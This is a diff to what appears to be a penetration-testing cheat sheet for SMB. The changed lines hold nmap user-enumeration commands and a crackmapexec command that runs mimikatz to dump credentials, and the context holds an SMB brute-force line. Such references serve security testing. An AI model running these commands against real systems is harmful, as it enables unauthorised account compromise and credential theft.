@@ -53,9 +53,9 @@ enum4linux -u <username> -p <password> -P <target>
 nmap -p 445 --script smb-enum-users <target> --script-args smbuser=<username>,smbpass=<password>,smbdomain=<smbdomain>
 nmap -p 445 --script smb-enum-users <target> --script-args smbuser=<username>,smbhash=<lm:ntlm>,smbdomain=<smbdomain>
 
-nmap --script smb-enum-users.nse --script-args smbusername=<smbusername>,smbpass=<password>,smbdomain=workstation -p445 <target>
+nmap --script smb-enum-users.nse --script-args smbusername=<username>,smbpass=<password>,smbdomain=workstation -p445 <target>
 
-nmap --script smb-enum-users.nse --script-args smbusername=<smbusername>,smbhash=<lm:ntlm>,smbdomain=<smbdomain> -p445 <target>
+nmap --script smb-enum-users.nse --script-args smbusername=<username>,smbhash=<lm:ntlm>,smbdomain=<smbdomain> -p445 <target>
 
 # nmap - Enum Groups
 nmap -p 445 --script smb-enum-groups <target> --script-args smbuser=<username>,smbpass=<password>,smbdomain=<smbdomain>
@@ -82,6 +82,7 @@ nmap -p 445 --script smb-vuln-ms06-025 --script smb-vuln-ms07-029 --script smb-v
 # map - Brute Force Accounts (be aware of account lockout!)
 nmap –p 445 --script smb-brute –script-args userdb=user-list.txt,passdb=pass-list.txt <target>
 
-crackmapexec smb <target> -u <> -p 'P@ssw0rd' -M mimikatz
+# using cme with mimikatz
+crackmapexec smb <target> -u <username> -p '<password>' -M mimikatz
 
 $ target: if [[ ! -z $target ]]; then; echo $target; else echo ""; fi
